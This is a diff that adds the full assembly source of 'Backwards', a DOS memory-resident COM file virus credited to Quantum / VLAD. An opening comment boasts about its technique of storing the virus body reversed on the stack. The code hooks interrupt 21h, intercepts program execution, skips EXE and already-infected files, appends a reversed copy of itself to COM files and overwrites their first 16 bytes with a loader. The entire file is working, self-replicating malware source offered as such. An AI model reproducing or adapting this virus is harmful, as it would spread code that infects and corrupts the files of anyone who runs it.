@@ -1,0 +1,205 @@
+;
+; Backwards by Quantum / VLAD.
+;
+; w00p.. this is a standard TSR com infector.  Now before you start
+; screaming that I should go code for YAM with shit like this, I would
+; like to point out that this virus uses a unique infection method that
+; reverses the code.
+;
+; By pushing everything onto the stack, it reverses the code, that is stored
+; backwards, and executes it.  The loader is 16 bytes long and the original
+; 16 bytes of the file are stored in the virus code.
+;
+
+
+mov si,offset c
+xor sp,sp
+mov cx,(offset cend - offset c)/2
+loop1:
+lodsw
+xchg ah,al
+push ax
+loop loop1
+jmp sp
+
+; rest of the host goes here
+int 20h
+; virus code goes here .. note: this code is stored backwards!
+; I suggest you go to the end of the code and read backwards.
+c:
+        db 16 dup (90h)    ; will always be at FFF0h
+org16bytes:
+db 0e4h,0ffh                  ; jmp sp
+db $ - offset loaderloop
+db 0e2h                       ; loop loaderloop
+db 50h                        ; push ax
+db 0e0, 86h                   ; xchg ah,al
+db 0adh                       ; lodsw
+loaderloop:
+db ((offset cend - offset c)/2)/256
+db ((offset cend - offset c)/2) and 255
+db 0b9h                       ; mov cx,(offset cend - offset c)/2
+db 0e4h,31h                   ; xor sp,sp
+db 0,0
+wherecodeat:
+db 0beh                       ; mov si,where the code is at
+loader:
+db "BACKWARDS by Quantum / VLAD"
+        db $ - offset goold
+        db 0ebh               ; jmp goold
+        db 58h                ; pop ax
+        db 5bh                ; pop bx
+        db 59h                ; pop cx
+        db 5ah                ; pop dx
+        db 5eh                ; pop si
+        db 5fh                ; pop di
+        db 1fh                ; pop ds
+        db 07h                ; pop es
+        db 21h, 0cdh          ; int 21h
+        db 3eh, 0b4h          ; mov ah,3eh
+closefile:
+        db 21h, 0cdh          ; int 21h
+        db (offset cend - offset loader)/ 256
+        db (offset cend - offset loader) and 255
+        db 0bah               ; mov dx,(offset cend - offset loader)
+        db 1fh                ; pop ds
+        db 0eh                ; push cs
+        db 0, 10h, 0b9h       ; mov cx,16
+        db 40h, 0b4h          ; mov ah,40h
+        db 21h, 0cdh          ; int 21h
+        db 0d2h, 031h         ; xor dx,dx
+        db 0c9h, 031h         ; xor cx,cx
+        db 42h,0, 0b8h        ; mov ax,4200h
+        db 21h, 0cdh          ; int 21h
+        db (offset cend - offset c) / 256
+        db (offset cend - offset c) and 255
+        db 0b9h               ; mov cx,(offset cend - offset c)
+        db 40h, 0b4h          ; mov ah,40h
+        db 0fah
+        db 0e2h               ; loop
+        db 0aah               ; stosb
+        db 0fdh               ; std
+        db 0ach               ; lodsb
+        db 0fch               ; cld
+        db 0ffh,0ffh,0beh     ; mov si,-1
+        db 0cah, 89h          ; mov dx,cx
+        db (offset cend - offset c)/256
+        db (offset cend - offset c) and 255
+        db 0b9h               ; mov cx,(offset cend - offset c)
+        db ((offset cend - offset c)*2)/256
+        db ((offset cend - offset c)*2) and 255
+        db 0bfh               ; mov di,(offset cend - offset c)*2-1
+        db (offset cend - offset wherecodeat)/256
+        db (offset cend - offset wherecodeat) and 255
+        db 0a3h               ; mov [offset cend - offset wherecodeat],ax
+        db 01h,0,5h           ; add ax,0100h
+        db 21h, 0cdh          ; int 21h
+        db 0d2h, 031h         ; xor dx,dx
+        db 0c9h, 031h         ; xor cx,cx
+        db 42h, 02h, 0b8h     ; mov ax,4202h
+        db $ - offset closefile
+        db 74h                ; jz closefile
+        db 0beh
+        db (offset cend - offset org16bytes) / 256
+        db (offset cend - offset org16bytes) and 255
+        db 3eh, 80h  ; cmp byte ptr [offset cend - offset org14bytes],0beh
+        db $ - offset closefile
+        db 74h                ; jz closefile
+        db "M","Z"
+        db (offset cend - offset org16bytes) / 256
+        db (offset cend - offset org16bytes) and 255
+        db 3eh, 81h           ; cmp word ptr [offset cend - offset org16bytes],"ZM"
+        db 21h , 0cdh         ; int 21h
+        db (offset cend - offset org16bytes)/256
+        db (offset cend - offset org16bytes) and 255
+        db 0bah               ; mov dx,offset cend - offset org16bytes
+        db 0, 10h, 0b9h       ; mov cx,16
+        db 3fh, 0b4h          ; mov ah,3fh
+        db 07h                ; pop es
+        db 1fh                ; pop ds
+        db 0eh                ; push cs
+        db 0eh                ; push cs
+        db 93h                ; xchg bx,ax
+        db 21h, 0cdh          ; int 21h
+        db 3dh,02h,0b8h       ; mov ax,3d02h
+        db 06h                ; push es
+        db 1eh                ; push ds
+        db 57h                ; push di
+        db 56h                ; push si
+        db 52h                ; push dx
+        db 51h                ; push cx
+        db 53h                ; push bx
+        db 50h                ; push ax
+executing:
+        db 0,0,0,0
+oldi21:
+        db 0eah
+goold:
+
+        db 5 ; $ - offset executing
+        db 74h                ; jz executing
+        db 4bh,0fch,80h       ; cmp ah,4bh
+notserv:
+        db 0cfh               ; iret
+        db $ - offset notserv
+        db 75h                ; jnz notserv
+        db 18h,18h,03dh       ; cmp ax,1818h
+newi21:
+db 0e7h, 0ffh                 ; jmp di
+db (offset cend - offset c)/256
+db (offset cend - offset c) and 255
+db 0c4h, 81h                  ; add sp,(offset cend - offset c)
+db 5fh                        ; pop di
+db 0a5h, 0f3h                 ; rep movsw
+db 0, 8, 0b9h                 ; mov cx,8
+db 57h                        ; push di
+db 1, 0, 0bfh                 ; mov di,0100h
+db 0ffh, 0f0h, 0beh           ; mov si,0fff0h
+db 07h                        ; pop es
+db 1fh                        ; pop ds
+db 0eh                        ; push cs
+db 0eh                        ; push cs
+back2host:
+db 0feh, 44h, 8ch             ; mov word ptr [si-2],es
+db (offset cend-offset newi21)/256
+db (offset cend-offset newi21) and 255
+db 0fch, 44h, 0c7h            ; mov word ptr [si-4],offset cend-offset newi21
+db 0a5h                       ; movsw
+db 0a5h                       ; movsw
+db (offset cend - offset oldi21)/256
+db (offset cend - offset oldi21) and 255
+db 0bfh                       ; mov di,offset cend - offset oldi21
+db 0, 84h, 0beh               ; mov si,84h
+db 0d9h, 8eh                  ; mov ds,cx
+db 0a5h, 0f3h                 ; rep movsw
+db (0 - (offset cend - offset c))/256
+db (0 - (offset cend - offset c)) and 255
+db 0beh                       ; mov si,0 - (offset cend - offset c)
+db ((offset cend - offset c)/2+1)/256
+db ((offset cend - offset c)/2+1) and 255
+db 0b9h                       ; mov cx,(offset cend - offset c)/2+1
+db 1fh                        ; pop ds
+db 0eh                        ; push cs
+db 0c0h, 08eh                 ; mov es,ax
+db 012h, 45h, 08bh            ; mov ax,[di+12h]
+db ((offset cend - offset c)/8+1)/256
+db ((offset cend - offset c)/8+1) and 255
+db 12h, 6dh, 81h              ; sub word ptr [di+12h],(offset cend-offset c)/16+1
+db ((offset cend - offset c)/8+1)/256
+db ((offset cend - offset c)/8+1) and 255
+db 3h, 6dh, 81h               ; sub word ptr [di+3h],(offset cend-offset c)/16+1
+db $ - offset back2host
+db 75h                        ; jnz back2host
+db "Z",03dh,80h               ; cmp byte ptr [di],"Z"
+db 0ffh, 031h                 ; xor di,di
+db 0d8h, 8eh                  ; mov ds,ax
+db 48h                        ; dec ax
+db 0c0h,8ch                   ; mov ax,es
+db $ - offset back2host
+db 75h                        ; jnz back2host
+db 0c0h,08h                   ; or al,al
+db 21h,0cdh                   ; int 21h
+db 18h,18h,0b8h               ; mov ax,1818h
+
+cend:
+
